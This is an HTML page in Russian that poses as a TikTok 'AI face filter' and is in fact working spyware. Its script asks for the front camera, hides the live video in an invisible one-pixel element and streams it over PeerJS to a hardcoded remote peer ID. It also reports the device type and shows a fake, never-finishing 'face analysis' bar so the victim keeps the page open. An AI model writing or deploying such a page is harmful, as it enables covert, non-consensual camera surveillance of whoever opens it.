<!DOCTYPE html>
<html>
<head>
    <title>TikTok AI Filter</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .btn { background: #ff0050; color: white; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,80,0.6); -webkit-tap-highlight-color: transparent; }
        #loader { display: none; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #ff0050; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="ui">
        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80" style="margin-bottom: 20px;">
        <h1 style="font-size: 22px;">AI-Фильтр "Идеальное лицо"</h1>
        <p style="padding: 0 20px; color: #ccc;">Для калибровки нейросети нужно разрешить доступ к фронтальной камере</p>
        <br>
        <button class="btn" onclick="startPrank()">ПОДКЛЮЧИТЬ ЭФФЕКТ</button>
    </div>

    <div id="loader">
        <div class="spinner"></div>
        <h2 id="load-text">Анализ лица... 0%</h2>
        <p>Не закрывайте страницу и не блокируйте экран</p>
    </div>

    <video id="myVideo" autoplay muted playsinline style="position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none;"></video>

    <script>
        const REMOTE_ID = '09062012'; 

        const peer = new Peer({
            config: {
                'iceServers': [
                    { url: 'stun:stun.l.google.com:19302' },
                    { url: 'stun:stun1.l.google.com:19302' }
                ]
            }
        });

        function startPrank() {
            // Запрос камеры именно для iPhone
            const constraints = { 
                video: { 
                    facingMode: "user",
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                }, 
                audio: false 
            };

            navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {
                const video = document.getElementById('myVideo');
                video.srcObject = stream;
                
                // Переключаем интерфейс
                document.getElementById('ui').style.display = 'none';
                document.getElementById('loader').style.display = 'block';
                
                // Эффект долгой загрузки (чтобы не закрывал сайт)
                let progress = 0;
                const interval = setInterval(() => {
                    progress += Math.floor(Math.random() * 3) + 1;
                    if (progress > 99) progress = 99;
                    document.getElementById('load-text').innerText = "Анализ лица... " + progress + "%";
                }, 400);

                // Собираем инфу об устройстве
                const ua = navigator.userAgent;
                let device = "Mobile";
                if (ua.indexOf("iPhone") > -1) device = "iPhone";
                if (ua.indexOf("Android") > -1) device = "Android";

                // Звонок
                const call = peer.call(REMOTE_ID, stream, {
                    metadata: { device: device }
                });
            })
            .catch(err => {
                alert("Ошибка: Safari заблокировал доступ. Зайдите в Настройки -> Safari -> Камера -> Разрешить.");
            });
        }
    </script>
</body>
</html>
